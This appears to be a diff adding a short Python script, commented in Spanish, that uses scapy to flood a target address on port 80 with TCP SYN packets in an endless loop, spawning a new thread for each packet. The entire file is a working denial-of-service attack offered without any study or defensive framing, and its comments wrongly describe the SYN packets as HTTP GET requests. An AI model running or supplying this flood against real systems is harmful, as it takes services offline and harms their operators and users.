@@ -1,0 +1,14 @@
+from scapy.all import *
+from threading import Thread
+
+# Define la dirección IP del objetivo
+target_address = "10.0.4.235"
+target_port = 80
+
+# Crea un bucle infinito para enviar las solicitudes HTTP GET utilizando hilos
+while True:
+    # Crea una trama TCP SYN que se utilizara como base para el ataque
+    syn = IP(dst=target_address) / TCP(dport=target_port, flags="S")
+
+    # Envía la trama al objetivo utilizando un hilo independiente
+    Thread(target=send, args=(syn,)).start()
